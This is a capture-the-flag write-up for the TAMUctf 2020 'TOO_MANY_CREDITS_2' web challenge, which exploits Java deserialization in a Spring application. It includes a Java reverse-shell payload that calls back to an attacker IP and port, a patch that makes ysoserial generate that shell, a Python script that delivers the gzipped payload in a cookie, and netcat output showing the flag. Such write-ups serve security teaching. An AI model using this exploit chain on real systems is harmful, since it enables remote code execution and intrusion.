# TAMUctf 2020 – TOO_MANY_CREDITS_2

* **Category:** web
* **Points:** 432

## Challenge

> Even if you could get the first flag, I bet you can't pop a shell!
> 
> http://toomanycredits.tamuctf.com

## Solution

This challenge is the continuation of the previous one.

Considering that:
* the backend is using Java;
* there is the Spring logo in the favicon.

This is a Java Deserialization vulnerability which can lead to a Remote Code Execution.

[ysoserial](https://github.com/frohoff/ysoserial) `Spring1` payload can be used to have a RCE, but I was not able to find how to exfiltrate the output of commands via pure shell.

So I downloaded ysoserial source code and I patched it in order to have a Java based shell inspired from [this one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1).

```java
java.lang.String host="x.x.x.x";
int port=1337;
java.lang.String[] cmd={"commands", "here"};
java.lang.Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50L);try {p.exitValue();break;}catch (java.lang.Exception e){}};p.destroy();s.close();
```

You can change the code into [`ysoserial.payloads.util.Gadgets`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java#L117) class from this...

```java
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
```

to this...

```java
        String command_tmp = "";
        for (String s: command.split(" ")) {
           command_tmp += ("\"" + s + "\",");
        }
        command_tmp = command_tmp.substring(0, command_tmp.length() - 1);
        String cmd = "java.lang.String host=\"x.x.x.x\";int port=1337;java.lang.String[] cmd={" +
            command_tmp.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
              "};java.lang.Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50L);try {p.exitValue();break;}catch (java.lang.Exception e){}};p.destroy();s.close();";
```

You can see the complete Java file [here](Gadgets.java).

At this point you can setup a listening host with `nc -lvkp 1337` and you can improve the [Python script](too-many-credits-2-solver.py) for the previous challenge in order to use the patched ysoserial and to read the produced payload.

```python
import gzip
import base64
import requests
import os
import sys
import time

payload_file = "payload-spring1.bin"
url = "http://toomanycredits.tamuctf.com/"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
   "Referer": "http://toomanycredits.tamuctf.com/"
}

command = sys.argv[1]

payload = "{}".format(command)
print("[*] Creating payload: {}".format(payload))
os.remove(payload_file)
os.popen("java -jar ./ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 \"{}\" > {}".format(payload, payload_file))
time.sleep(5)

with open(payload_file, "rb") as f:
    malicious_payload = f.read()

print("[*] Malicious payload is: {}".format(malicious_payload))

compressed_malicious_bytes = gzip.compress(malicious_payload)
print("[*] Compressed malicious bytes are: {}".format(compressed_malicious_bytes))

base64_compressed_malicious_payload = base64.b64encode(compressed_malicious_bytes).decode("ascii")
print("[*] Base64 compressed malicious string is: {}".format(base64_compressed_malicious_payload))

print("[*] Sending request.")
cookies = dict(counter="\"{}\"".format(base64_compressed_malicious_payload))
page = requests.get(url, headers=headers, cookies=cookies)

print("[*] Response received:\n\n{}".format(page.text))
```

Launching commands will allow you to discover the flag.

```
root@m3ssap0:~/Desktop# python3 too-many-credits-2-solver.py "ls"
root@m3ssap0:~/Desktop# python3 too-many-credits-2-solver.py "cat flag.txt"



root@m3ssap0:~# nc -lvkp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from ec2-34-208-211-186.us-west-2.compute.amazonaws.com 57272 received!
bin
flag.txt
lib
Connection from ec2-34-208-211-186.us-west-2.compute.amazonaws.com 57388 received!
gigem{da$h_3_1s_A_l1f3seNd}
```

The flag is the following.

```
gigem{da$h_3_1s_A_l1f3seNd}
```
